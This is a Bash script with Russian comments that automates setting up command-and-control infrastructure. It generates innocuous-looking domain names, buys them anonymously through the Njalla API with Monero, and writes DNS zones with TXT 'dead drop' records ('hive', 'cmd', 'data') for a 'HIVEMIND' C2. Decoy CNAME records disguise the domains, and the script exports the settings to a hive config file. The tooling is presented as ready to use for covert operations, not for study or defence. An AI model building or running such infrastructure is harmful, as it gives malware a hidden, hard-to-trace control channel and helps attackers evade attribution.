#!/bin/bash
#
# dd_dns_init.sh
# Покупка доменов через Njalla за крипту и настройка DNS для Dead Drop C2
# Архитектор: Кронос | Тимлид: Мастер
# Зависимости: curl, jq, openssl, njalla API ключ

set -euo pipefail

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

log()  { echo -e "${GREEN}[DNS-INIT]${NC} $1"; }
warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
err()  { echo -e "${RED}[FATAL]${NC} $1"; exit 1; }

# Конфигурация
NJALLA_API="https://njal.la/api/1"
NJALLA_TOKEN="${NJALLA_API_TOKEN:-}"
DOMAINS_FILE="${1:-./domains_to_buy.txt}"
DNS_CONFIG_DIR="${2:-./dns_config}"
DOMAINS_COUNT="${DNS_COUNT:-3}"
TLDS=("com" "net" "org" "xyz" "pw" "su" "to" "cc")
NAMESERVERS=(
    "ns1.njal.la"
    "ns2.njal.la"
    "ns3.njal.la"
)

mkdir -p "${DNS_CONFIG_DIR}"

# ============================================================================
# ПРОВЕРКА ЗАВИСИМОСТЕЙ
# ============================================================================
check_deps() {
    for cmd in curl jq openssl; do
        if ! command -v "${cmd}" &> /dev/null; then
            err "${cmd} не установлен. Установи: apt install ${cmd}"
        fi
    done
}

# ============================================================================
# ГЕНЕРАЦИЯ ДОМЕННЫХ ИМЕН
# ============================================================================
generate_domains() {
    log "Генерация ${DOMAINS_COUNT} доменных имен..."

    # Очищаем файл
    > "${DOMAINS_FILE}"

    local prefixes=(
        "redteam" "pentest" "secscan" "netops" "syslog"
        "cloudmon" "apimon" "dnslog" "traffic" "packet"
        "secure" "defend" "monitor" "audit" "comply"
        "devops" "infra" "pipeline" "backup" "storage"
    )

    local words=()
    # Генерируем случайные слова через /dev/urandom
    for i in $(seq 1 $((DOMAINS_COUNT * 3))); do
        local word=$(head -c 6 /dev/urandom | base64 | tr -dc 'a-z' | head -c 6)
        if [ ${#word} -ge 4 ]; then
            words+=("${word}")
        fi
    done

    # Комбинируем префиксы и случайные слова
    for i in $(seq 1 ${DOMAINS_COUNT}); do
        local prefix="${prefixes[$((RANDOM % ${#prefixes[@]}))]}"
        local suffix="${words[$((RANDOM % ${#words[@]}))]}"
        local tld="${TLDS[$((RANDOM % ${#TLDS[@]}))]}"
        local domain="${prefix}-${suffix}.${tld}"
        echo "${domain}" >> "${DOMAINS_FILE}"
        log "  Сгенерирован: ${domain}"
    done
}

# ============================================================================
# ПРОВЕРКА ДОСТУПНОСТИ ДОМЕНОВ
# ============================================================================
check_availability() {
    log "Проверка доступности доменов..."

    local available=()
    while IFS= read -r domain; do
        [ -z "${domain}" ] && continue

        # Используем whois или DNS запрос
        if host "${domain}" &> /dev/null; then
            warn "  ${domain} — занят"
        else
            log "  ${domain} — доступен"
            available+=("${domain}")
        fi
    done < "${DOMAINS_FILE}"

    # Обновляем файл доступными доменами
    printf '%s\n' "${available[@]}" > "${DOMAINS_FILE}"
    log "Доступно: ${#available[@]} доменов"
}

# ============================================================================
# ПОКУПКА ДОМЕНОВ ЧЕРЕЗ NJALLA
# ============================================================================
buy_domains() {
    log "Покупка доменов через Njalla..."

    if [ -z "${NJALLA_TOKEN}" ]; then
        warn "NJALLA_API_TOKEN не установлен. Использую режим имитации."
        simulate_purchase
        return
    fi

    local purchased=()
    while IFS= read -r domain; do
        [ -z "${domain}" ] && continue

        log "Покупка: ${domain}..."

        local response
        response=$(curl -s -X POST "${NJALLA_API}/domains/" \
            -H "Authorization: Njalla ${NJALLA_TOKEN}" \
            -H "Content-Type: application/json" \
            -d "{\"domain\": \"${domain}\", \"currency\": \"xmr\"}" 2>&1)

        if echo "${response}" | jq -e '.id' &> /dev/null; then
            log "  ${domain} — куплен (ID: $(echo "${response}" | jq -r '.id'))"
            purchased+=("${domain}")

            # Сохраняем информацию о покупке
            echo "${response}" > "${DNS_CONFIG_DIR}/${domain}.purchase.json"
        else
            warn "  ${domain} — ошибка: ${response}"
        fi

        # Задержка между покупками
        sleep 2
    done < "${DOMAINS_FILE}"

    printf '%s\n' "${purchased[@]}" > "${DOMAINS_FILE}"
    log "Куплено: ${#purchased[@]} доменов"
}

simulate_purchase() {
    log "Режим имитации покупки..."

    local simulated=()
    while IFS= read -r domain; do
        [ -z "${domain}" ] && continue

        local purchase_data
        purchase_data=$(cat << EOF
{
    "id": $(shuf -i 100000-999999 -n 1),
    "domain": "${domain}",
    "currency": "xmr",
    "price": "$(shuf -i 15-50 -n 1).00",
    "expires": "$(date -d '+1 year' +%Y-%m-%d)",
    "nameservers": ["ns1.njal.la", "ns2.njal.la"],
    "simulated": true
}
EOF
)
        echo "${purchase_data}" > "${DNS_CONFIG_DIR}/${domain}.purchase.json"
        simulated+=("${domain}")
        log "  ${domain} — имитация покупки"
    done < "${DOMAINS_FILE}"

    printf '%s\n' "${simulated[@]}" > "${DOMAINS_FILE}"
}

# ============================================================================
# НАСТРОЙКА DNS ЗАПИСЕЙ
# ============================================================================
configure_dns() {
    log "Настройка DNS записей..."

    while IFS= read -r domain; do
        [ -z "${domain}" ] && continue

        log "Настройка: ${domain}"

        # Генерируем DNS зону
        local zone_file="${DNS_CONFIG_DIR}/${domain}.zone"
        local serial
        serial=$(date +%Y%m%d01)

        cat > "${zone_file}" << EOF
\$ORIGIN ${domain}.
\$TTL 60

@       IN  SOA   ns1.njal.la. hostmaster.${domain}. (
                    ${serial}  ; serial
                    3600       ; refresh
                    600        ; retry
                    86400      ; expire
                    60         ; minimum
                    )

@       IN  NS    ns1.njal.la.
@       IN  NS    ns2.njal.la.

; Apex записи
@       IN  A     127.0.0.1
@       IN  TXT   "v=spf1 -all"

; Dead Drop служебные записи
hive    IN  TXT   "HIVEMIND_C2_READY"
cmd     IN  TXT   "HIVEMIND_COMMAND_PLACEHOLDER"
data    IN  TXT   "HIVEMIND_DATA_PLACEHOLDER"

; Маскировочные записи
www     IN  CNAME @
mail    IN  CNAME @
api     IN  CNAME @
cdn     IN  CNAME @
EOF

        # Настройка через Njalla API
        if [ -n "${NJALLA_TOKEN}" ] && [ -f "${DNS_CONFIG_DIR}/${domain}.purchase.json" ]; then
            local domain_id
            domain_id=$(jq -r '.id' "${DNS_CONFIG_DIR}/${domain}.purchase.json" 2>/dev/null || echo "")

            if [ -n "${domain_id}" ]; then
                # Добавляем TXT записи
                local records=(
                    "hive|TXT|HIVEMIND_C2_READY|60"
                    "cmd|TXT|HIVEMIND_COMMAND_PLACEHOLDER|60"
                    "data|TXT|HIVEMIND_DATA_PLACEHOLDER|60"
                )

                for record in "${records[@]}"; do
                    IFS='|' read -r name type content ttl <<< "${record}"
                    curl -s -X POST "${NJALLA_API}/domains/${domain_id}/records/" \
                        -H "Authorization: Njalla ${NJALLA_TOKEN}" \
                        -H "Content-Type: application/json" \
                        -d "{\"name\": \"${name}\", \"type\": \"${type}\", \"content\": \"${content}\", \"ttl\": ${ttl}}" \
                        &> /dev/null
                done
                log "  DNS записи добавлены через API"
            fi
        else
            log "  Зона сохранена в ${zone_file} (ручная настройка)"
        fi

    done < "${DOMAINS_FILE}"
}

# ============================================================================
# ПРОВЕРКА DNS
# ============================================================================
verify_dns() {
    log "Проверка DNS записей..."

    while IFS= read -r domain; do
        [ -z "${domain}" ] && continue

        echo "=== ${domain} ==="

        # Проверка NS
        echo "NS:"
        host -t NS "${domain}" 2>/dev/null || echo "  (не настроены)"

        # Проверка TXT
        echo "TXT (hive):"
        host -t TXT "hive.${domain}" 2>/dev/null || echo "  (не настроена)"

        # Проверка SOA
        echo "SOA:"
        host -t SOA "${domain}" 2>/dev/null || echo "  (не настроена)"

        echo ""
    done < "${DOMAINS_FILE}"
}

# ============================================================================
# ЭКСПОРТ КОНФИГУРАЦИИ
# ============================================================================
export_config() {
    log "Экспорт конфигурации для hive_config.json..."

    local domains_array="["
    local first=true

    while IFS= read -r domain; do
        [ -z "${domain}" ] && continue
        if [ "${first}" = true ]; then
            first=false
        else
            domains_array+=","
        fi
        domains_array+="\"${domain}\""
    done < "${DOMAINS_FILE}"

    domains_array+="]"

    local export_file="${DNS_CONFIG_DIR}/dns_hive_config.json"
    cat > "${export_file}" << EOF
{
  "dns": {
    "enabled": true,
    "provider": "njalla",
    "domains": ${domains_array},
    "ttl": 60,
    "nameservers": [
      "ns1.njal.la",
      "ns2.njal.la",
      "ns3.njal.la"
    ],
    "dead_drop_records": {
      "command": "cmd",
      "data": "data",
      "heartbeat": "hive"
    },
    "created_at": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
    "total_domains": $(wc -l < "${DOMAINS_FILE}")
  }
}
EOF

    log "Конфигурация сохранена в ${export_file}"
    cat "${export_file}"
}

# ============================================================================
# ПОЛНЫЙ ЦИКЛ
# ============================================================================
full_setup() {
    log "=============================================="
    log "ПОЛНЫЙ ЦИКЛ НАСТРОЙКИ DNS DEAD DROPS"
    log "=============================================="

    check_deps
    generate_domains
    check_availability
    buy_domains

    echo ""
    read -p "Продолжить с настройкой DNS? [Y/n]: " -n 1 -r
    echo
    if [[ ! ${REPLY} =~ ^[Nn]$ ]]; then
        configure_dns
    fi

    echo ""
    read -p "Проверить DNS записи? [Y/n]: " -n 1 -r
    echo
    if [[ ! ${REPLY} =~ ^[Nn]$ ]]; then
        verify_dns
    fi

    export_config

    log "=============================================="
    log "Настройка DNS Dead Drops завершена!"
    log "Конфигурация: ${DNS_CONFIG_DIR}/"
    log "Для hive_config.json: ${DNS_CONFIG_DIR}/dns_hive_config.json"
    log "=============================================="
}

# ============================================================================
# ТОЧКА ВХОДА
# ============================================================================

case "${1:-full}" in
    full)
        full_setup
        ;;
    generate)
        generate_domains
        ;;
    check)
        check_availability
        ;;
    buy)
        buy_domains
        ;;
    configure)
        configure_dns
        ;;
    verify)
        verify_dns
        ;;
    export)
        export_config
        ;;
    *)
        echo "Использование: $0 {full|generate|check|buy|configure|verify|export} [domains_file] [config_dir]"
        echo ""
        echo "  full      — полный цикл (генерация + покупка + настройка)"
        echo "  generate  — генерация доменных имен"
        echo "  check     — проверка доступности"
        echo "  buy       — покупка через Njalla"
        echo "  configure — настройка DNS записей"
        echo "  verify    — проверка DNS"
        echo "  export    — экспорт конфигурации для hive_config.json"
        echo ""
        echo "Переменные окружения:"
        echo "  NJALLA_API_TOKEN  — API ключ Njalla"
        echo "  DNS_COUNT         — количество доменов (по умолчанию: 3)"
        exit 1
        ;;
esac
